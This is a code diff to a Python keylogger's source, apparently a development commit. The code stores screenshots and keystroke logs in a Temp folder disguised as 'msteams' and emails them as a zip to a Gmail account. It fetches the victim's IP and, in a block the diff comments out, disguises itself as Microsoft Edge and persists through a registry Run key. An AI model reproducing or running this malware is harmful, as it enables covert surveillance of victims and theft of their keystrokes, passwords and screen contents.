@@ -32,6 +32,7 @@ USER_NAME = getpass.getuser()
 working_folder = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams"
 screenshots_folder = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams\stuff"
 log_file = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams\log.txt"
+zip_file = rf"C:\Users\{USER_NAME}\AppData\Local\Temp\msteams\screenshots"
 
 curr_window = ""
 
@@ -87,7 +88,7 @@ def send_report():
         msg['Subject'] = f"Report From {ip}"
         msg['From'] = EMAIL
         msg['To'] = EMAIL
-        zip_path = shutil.make_archive("screenshots_zip", "zip", screenshots_folder)
+        zip_path = shutil.make_archive(zip_file, "zip", screenshots_folder)
         attach_file(msg, zip_path)
         attach_file(msg, log_file)
         with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
@@ -135,12 +136,12 @@ def setup():
 
     # setup persistence 
 
-    os_type = platform.system()
-    if os_type == "Windows":
-        location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
-        if not os.path.exists(location):
-            shutil.copyfile(executable, location)
-            subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
+    # os_type = platform.system()
+    # if os_type == "Windows":
+    #     location = os.environ['appdata'] + "\\MicrosoftEdgeLauncher.exe" # Disguise the keylogger as Microsoft Edge
+    #     if not os.path.exists(location):
+    #         shutil.copyfile(executable, location)
+    #         subprocess.call(rf'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MicrosoftEdge /t REG_SZ /d "{location}" ', shell=True)
 
     try: 
         data = str(urlopen('http://checkip.dyndns.com/').read())
